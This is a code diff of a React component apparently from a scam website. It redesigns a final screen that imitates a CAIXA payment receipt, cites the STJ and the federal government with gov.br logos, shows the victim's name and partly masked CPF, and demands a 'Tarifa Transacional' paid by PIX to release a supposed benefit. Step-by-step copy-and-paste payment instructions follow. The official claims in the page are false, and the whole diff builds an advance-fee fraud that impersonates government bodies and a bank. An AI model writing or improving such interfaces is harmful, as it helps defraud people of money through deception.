@@ -269,96 +269,221 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
              </motion.div>
           )}
 
-          {/* Estado Final (Ticket Caixa) embutido no chat */}
+          {/* Estado Final (Ticket Caixa + Passo a Passo PIX) */}
           {flowState === 2 && (
             <motion.div 
               initial={{ opacity: 0, y: 15 }}
               animate={{ opacity: 1, y: 0 }}
-              className="flex justify-start items-start gap-3 mt-6 pb-20"
+              className="flex flex-col gap-8 mt-6 pb-20 items-center w-full"
             >
-              <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
-                <span className="text-white font-bold text-xs">gov.br</span>
-              </div>
-              <div className="w-full max-w-xs sm:max-w-sm rounded-xl overflow-hidden shadow-xl bg-[#f5f6f8]">
-                
+              
+              {/* Comprovante CAIXA */}
+              <div className="w-full max-w-sm rounded-xl overflow-hidden shadow-2xl bg-[#f5f6f8]">
                 {/* Header CAIXA Azul */}
-                <div className="bg-[#005CA9] px-4 py-5 flex items-center justify-center relative">
-                   <h2 className="text-white font-extrabold text-2xl tracking-widest relative z-10">CAIXA</h2>
-                   {/* Linha abstrata de fundo simulando o logo */}
-                   <div className="absolute inset-0 opacity-20 bg-[linear-gradient(45deg,transparent_45%,white_45%,white_55%,transparent_55%)] bg-[length:20px_20px]"></div>
+                <div className="bg-[#005CA9] px-6 py-6 flex items-end justify-start relative overflow-hidden">
+                   <h2 className="text-white font-extrabold text-3xl tracking-widest relative z-10 flex items-center">
+                     CAIXA 
+                     <span className="w-1 h-8 bg-orange-400 ml-3"></span>
+                   </h2>
+                   <div className="absolute inset-0 opacity-10 bg-[linear-gradient(45deg,transparent_45%,white_45%,white_55%,transparent_55%)] bg-[length:20px_20px]"></div>
                 </div>
 
-                <div className="bg-white p-4">
+                <div className="bg-white px-6 py-5 rounded-t-2xl -mt-3 relative z-20 shadow-[0_-4px_10px_rgba(0,0,0,0.05)]">
                   {/* Valores e Data Header */}
-                  <div className="flex justify-between items-start mb-4 border-b border-gray-200 pb-3">
+                  <div className="flex justify-between items-start mb-6">
                     <div>
-                      <p className="text-[11px] text-gray-500 uppercase tracking-wider font-semibold">Valor</p>
-                      <p className="text-[#005CA9] font-bold text-lg">{leadValue}</p>
+                      <p className="text-[13px] text-gray-500 font-medium mb-1">Valor</p>
+                      <p className="text-[#005CA9] font-extrabold text-2xl">{leadValue}</p>
                     </div>
+                    <div className="w-px bg-gray-200 h-10 mx-2"></div>
                     <div className="text-right">
-                      <p className="text-[11px] text-gray-500 uppercase tracking-wider font-semibold">Data</p>
-                      <p className="text-gray-700 text-sm">{new Date().toLocaleDateString('pt-BR')}</p>
-                      <p className="text-gray-500 text-xs">{new Date().toLocaleTimeString('pt-BR')}</p>
-                    </div>
-                  </div>
-
-                  {/* Alerta de PIX Pendente */}
-                  <div className="bg-red-50 rounded-lg p-3 flex items-start gap-3 mb-5 border border-red-100">
-                    <AlertCircle className="text-red-500 w-8 h-8 flex-shrink-0 mt-0.5" />
-                    <div>
-                      <h4 className="text-red-600 font-bold text-[15px]">PIX Pendente!</h4>
-                      <p className="text-red-400 text-xs">Aguardando Pagamento da Tarifa Transacional...</p>
+                      <p className="text-[13px] text-gray-500 font-medium mb-1">Data</p>
+                      <p className="text-[#005CA9] font-bold text-[15px]">{new Date().toLocaleDateString('pt-BR')}</p>
+                      <p className="text-[#005CA9] text-xs">{new Date().toLocaleTimeString('pt-BR')}</p>
                     </div>
                   </div>
 
                   {/* Dados do Recebedor */}
-                  <div className="space-y-3">
-                    <h3 className="text-gray-600 font-bold text-sm">Dados do Recebedor:</h3>
-                    
-                    <div>
-                      <p className="text-xs text-gray-500">Nome:</p>
-                      <p className="text-sm font-medium text-gray-800">{leadName}</p>
-                    </div>
-                    
-                    <div>
-                      <p className="text-xs text-gray-500">CPF:</p>
-                      <p className="text-sm font-medium text-gray-800">{data.docValue}</p>
-                    </div>
-
-                    <div>
-                      <p className="text-xs text-gray-500">Data de Nascimento:</p>
-                      <p className="text-sm font-medium text-gray-800">{data.birthDate}</p>
-                    </div>
-
-                    <div>
-                      <p className="text-xs text-gray-500">Chave Pix:</p>
-                      <p className="text-sm font-medium text-gray-800">{leadPixKey}</p>
+                  <div className="border-t-2 border-[#005CA9] pt-3 mb-6">
+                    <h3 className="text-[#005CA9] font-bold text-[15px] mb-4">Dados do recebedor</h3>
+                    <div className="space-y-4">
+                      <div>
+                        <p className="text-sm text-gray-500">Nome</p>
+                        <p className="text-base font-bold text-gray-800 uppercase">{leadName}</p>
+                      </div>
+                      <div>
+                        <p className="text-sm text-gray-500">CPF</p>
+                        <p className="text-base font-bold text-gray-800">***.{data.docValue.substring(3,6)}.{data.docValue.substring(7,10)}-**</p>
+                      </div>
+                      <div>
+                        <p className="text-sm text-gray-500">Instituição</p>
+                        <p className="text-base font-bold text-gray-800">CAIXA ECONÔMICA FEDERAL</p>
+                      </div>
                     </div>
                   </div>
 
-                  {/* Area de Pagamento da Tarifa */}
-                  <div className="mt-6 pt-5 border-t border-gray-200">
-                    <p className="text-center text-sm text-gray-600 font-medium mb-4">
-                      Tarifa Transicional Federal: <strong className="text-gray-900">R$ {tarifa.toFixed(2)}</strong>
-                    </p>
-
-                    {buyPixData?.pix_qr_code ? (
-                      <div className="flex flex-col items-center space-y-4">
-                        <div className="bg-white p-2 rounded-xl border border-gray-200 shadow-sm">
-                            <QRCodeCanvas value={buyPixData.pix_qr_code} size={180} />
-                        </div>
-                        <button onClick={copyPix} className="w-full bg-[#ff9029] hover:bg-[#e87f1f] text-white py-3 rounded-md font-bold transition-colors shadow-md text-sm">
-                            Copiar Código PIX
-                        </button>
+                  {/* Dados do Pagador */}
+                  <div className="border-t-2 border-[#005CA9] pt-3 relative">
+                    <h3 className="text-[#005CA9] font-bold text-[15px] mb-4">Dados do pagador</h3>
+                    <div className="space-y-4">
+                      <div>
+                        <p className="text-sm text-gray-500">Nome</p>
+                        <p className="text-base font-bold text-gray-800 uppercase">SUPERIOR TRIBUNAL DE JUSTIÇA - STJ</p>
                       </div>
-                    ) : (
-                      <div className="flex justify-center p-4">
-                        <Loader2 className="w-6 h-6 text-[#005CA9] animate-spin" />
+                      <div>
+                        <p className="text-sm text-gray-500">CNPJ</p>
+                        <p className="text-base font-bold text-gray-800">**.043.145/0001-**</p>
                       </div>
-                    )}
+                    </div>
+                    
+                    {/* Share Button */}
+                    <div className="absolute bottom-0 right-0 w-12 h-12 bg-white rounded-full shadow-[0_3px_10px_rgba(0,0,0,0.1)] flex items-center justify-center border border-gray-100 cursor-pointer">
+                      <svg className="w-5 h-5 text-orange-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z" /></svg>
+                    </div>
                   </div>
                 </div>
+                
+                {/* Avisos STJ/Gov */}
+                <div className="bg-[#f5f6f8] p-4 text-[10px] text-gray-500 text-center border-t border-gray-200">
+                  <p>O STJ (Superior Tribunal de Justiça) e o Governo Federal informam que o pagamento da Tarifa Transacional de <strong>R$ {tarifa.toFixed(2)}</strong> é obrigatório para a liberação do seu benefício.</p>
+                </div>
               </div>
+
+              {/* Instruções de Pagamento estilo gov.br */}
+              <div className="w-full max-w-sm mx-auto bg-[#004e98] rounded-xl overflow-hidden shadow-2xl pb-12 font-sans">
+                {/* Header Instruções */}
+                <div className="bg-white text-center py-8 px-4 rounded-b-[40px] mb-10 shadow-lg relative z-20">
+                   <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="h-8 mx-auto mb-4" />
+                   <h2 className="text-[#004e98] font-extrabold text-xl leading-tight">COMO REALIZAR O<br/>PAGAMENTO DA TARIFA?</h2>
+                   <p className="text-gray-500 text-xs mt-3 flex items-center justify-center gap-1">
+                     <AlertCircle className="w-3 h-3" /> É necessário o pagamento para a liberação
+                   </p>
+                </div>
+
+                <div className="px-4 space-y-16 relative">
+                  {/* Linha vertical pontilhada ligando os passos */}
+                  <div className="absolute left-1/2 top-0 bottom-0 w-px border-l-2 border-dashed border-[#246bc2] -translate-x-1/2 z-0"></div>
+
+                  {/* Passo 1 - Laptop */}
+                  <div className="relative z-10 flex flex-col items-center">
+                    <h3 className="text-[#1961bd] font-black text-5xl mb-6 opacity-60 drop-shadow-sm tracking-widest">PASSO 1</h3>
+                    
+                    {/* CSS Laptop Mockup */}
+                    <div className="flex flex-col items-center">
+                      <div className="bg-gray-800 p-2 rounded-t-xl w-[260px] h-[160px] flex items-center justify-center shadow-lg relative z-10 border-b-4 border-gray-900">
+                        {/* Tela do Laptop */}
+                        <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-start pt-3 relative overflow-hidden">
+                           <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="h-4 mb-2" />
+                           <p className="text-[10px] text-gray-500 font-bold mb-1">CÓDIGO PIX DA TARIFA</p>
+                           <p className="text-[#004e98] font-bold text-sm mb-2">R$ {tarifa.toFixed(2)}</p>
+                           
+                           {buyPixData?.pix_qr_code ? (
+                             <button onClick={copyPix} className="bg-[#004e98] hover:bg-[#003870] text-white text-[11px] py-2 px-6 rounded-full font-bold shadow-md transition-transform active:scale-95 flex items-center gap-1 z-20 cursor-pointer">
+                               <span>Copiar PIX</span>
+                               <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
+                             </button>
+                           ) : (
+                             <Loader2 className="w-5 h-5 text-[#004e98] animate-spin" />
+                           )}
+                           
+                           {/* Mouse cursor icon fake */}
+                           <div className="absolute right-12 bottom-6 text-black opacity-80 animate-bounce">
+                             <svg width="24" height="24" viewBox="0 0 24 24" fill="white" stroke="black" strokeWidth="2"><path d="M5.5 3.21V20.8c0 .45.54.67.85.35l4.86-4.86a.5.5 0 01.35-.15h6.42c.45 0 .67-.54.35-.85L6.35 2.85a.5.5 0 00-.85.35z"/></svg>
+                           </div>
+                        </div>
+                      </div>
+                      {/* Base do Laptop */}
+                      <div className="bg-gray-300 w-[300px] h-4 rounded-b-xl shadow-xl flex justify-center items-start z-0">
+                         <div className="bg-gray-400 w-16 h-1.5 rounded-b-md"></div>
+                      </div>
+                    </div>
+
+                    <p className="text-white text-center text-[15px] mt-6 px-8 font-medium">
+                      Copie o código PIX na tela acima clicando no botão azul.
+                    </p>
+                  </div>
+
+                  {/* Passo 2 - Laptop com senha (simulando app do banco) */}
+                  <div className="relative z-10 flex flex-col items-center">
+                    <div className="w-5 h-5 rounded-full border-[3px] border-[#004e98] bg-white absolute -top-10 z-10"></div>
+                    <h3 className="text-[#1961bd] font-black text-5xl mb-6 opacity-60 drop-shadow-sm tracking-widest">PASSO 2</h3>
+                    
+                    {/* CSS Laptop Mockup */}
+                    <div className="flex flex-col items-center">
+                      <div className="bg-gray-800 p-2 rounded-t-xl w-[260px] h-[160px] flex items-center justify-center shadow-lg relative z-10 border-b-4 border-gray-900">
+                        {/* Tela do Laptop */}
+                        <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-center p-4 relative overflow-hidden">
+                           <div className="w-12 h-12 bg-[#004e98] rounded-2xl flex items-center justify-center mb-3 text-white shadow-inner">
+                             <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
+                           </div>
+                           <p className="text-gray-800 font-bold text-sm">App do Banco</p>
+                           <div className="w-16 h-1 bg-gray-200 mt-2 rounded"></div>
+                        </div>
+                      </div>
+                      {/* Base do Laptop */}
+                      <div className="bg-gray-300 w-[300px] h-4 rounded-b-xl shadow-xl flex justify-center items-start z-0">
+                         <div className="bg-gray-400 w-16 h-1.5 rounded-b-md"></div>
+                      </div>
+                    </div>
+
+                    <p className="text-white text-center text-[15px] mt-6 px-8 font-medium">
+                      Abra o aplicativo do seu banco de preferência no seu celular.
+                    </p>
+                  </div>
+
+                  {/* Passo 3 - Celular + Cadeado (simulando colar o pix e segurança) */}
+                  <div className="relative z-10 flex flex-col items-center">
+                    <div className="w-5 h-5 rounded-full border-[3px] border-[#004e98] bg-white absolute -top-10 z-10"></div>
+                    <h3 className="text-[#1961bd] font-black text-5xl mb-6 opacity-60 drop-shadow-sm tracking-widest">PASSO 3</h3>
+                    
+                    {/* CSS Laptop + Celular lado a lado mockup */}
+                    <div className="flex items-end justify-center relative w-[300px] h-[180px]">
+                      {/* Laptop */}
+                      <div className="flex flex-col items-center absolute left-4 bottom-0">
+                        <div className="bg-gray-800 p-2 rounded-t-lg w-[200px] h-[130px] flex items-center justify-center shadow-lg border-b-2 border-gray-900">
+                          <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-center p-2 relative overflow-hidden">
+                             <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="h-3 mb-2" />
+                             <p className="text-[#004e98] font-bold text-xs">Segurança</p>
+                             <p className="text-green-500 text-[8px] font-bold mt-1">✓ Pagamento Confirmado</p>
+                          </div>
+                        </div>
+                        <div className="bg-gray-300 w-[230px] h-3 rounded-b-lg shadow-xl flex justify-center items-start"></div>
+                      </div>
+
+                      {/* Celular sobreposto */}
+                      <div className="bg-gray-800 p-1 rounded-2xl w-[70px] h-[120px] shadow-2xl absolute right-6 bottom-[-10px] border border-gray-600 z-20 flex flex-col">
+                        <div className="bg-white w-full h-full rounded-xl flex flex-col items-center pt-2 px-1 relative">
+                          <div className="w-4 h-1 bg-gray-300 rounded-full mb-2"></div>
+                          <div className="bg-yellow-400 text-[#004e98] text-[8px] font-black py-1 px-2 rounded-md shadow-sm w-full text-center">
+                            COLA PIX
+                          </div>
+                          <div className="bg-[#004e98] text-white text-[7px] py-1 px-2 rounded shadow mt-2 w-full text-center">
+                            CONFIRMAR
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
+                    <p className="text-white text-center text-[15px] mt-8 px-6 font-medium">
+                      Acesse a área PIX, escolha a opção <strong>Pix Copia e Cola</strong>, cole o código e confirme o pagamento.
+                    </p>
+                  </div>
+                  
+                  {/* Fundo de garantia - icone verde final */}
+                  <div className="relative z-10 flex flex-col items-center mt-10">
+                     <div className="bg-white rounded-full p-2 shadow-lg mb-4 border-4 border-[#004e98]">
+                        <div className="bg-green-500 rounded-full p-3">
+                          <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
+                        </div>
+                     </div>
+                     <p className="text-white text-center text-[15px] font-medium px-4">
+                       Assim que pago, o valor de <strong>{leadValue}</strong> será depositado automaticamente na sua conta.
+                     </p>
+                  </div>
+
+                </div>
+              </div>
+
             </motion.div>
           )}
 
